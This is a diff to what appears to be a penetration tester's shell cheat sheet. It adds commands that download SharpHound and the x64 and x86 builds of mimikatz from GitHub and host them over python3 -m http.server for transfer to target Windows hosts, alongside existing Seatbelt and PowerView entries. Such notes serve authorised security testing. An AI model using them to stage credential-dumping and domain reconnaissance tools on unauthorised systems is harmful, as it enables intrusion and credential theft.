@@ -19,6 +19,11 @@ else
 fi
 python3 -m http.server <port>
 
+# start hosting SharpHound.exe from current dir at non-sudo port
+curl -s https://api.github.com/repos/SpecterOps/SharpHound/releases/latest | grep "_windows_x86\.zip" | grep -v 'debug' | grep -v "zip\." | cut -d : -f 2,3 | tr -d \" | wget -qi -
+7z x SharpHound*.zip -bso0 -bsp0 && find . -maxdepth 1 -name "SharpHound*" ! -name "SharpHound.exe" -delete 
+python3 -m http.server <port>
+
 # start hosting Seatbelt.exe from current dir at non-sudo port
 wget -O seatbelt.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe
 python3 -m http.server <port>
@@ -59,3 +64,21 @@ else
     wget -O PowerView.ps1 https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1
 fi
 python3 -m http.server <port>
+
+# start hosting mimikatz.exe (x64) from current dir at non-sudo port
+if [ -f /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ]; then
+    cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
+else
+    wget -O mimikatz.exe https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe
+fi
+python3 -m http.server <port>
+
+
+# start hosting mimikatz.exe (x86) from current dir at non-sudo port
+if [ -f /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ]; then
+    cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
+else
+    wget -O mimikatz.exe https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/Win32/mimikatz.exe
+fi
+python3 -m http.server <port>
+
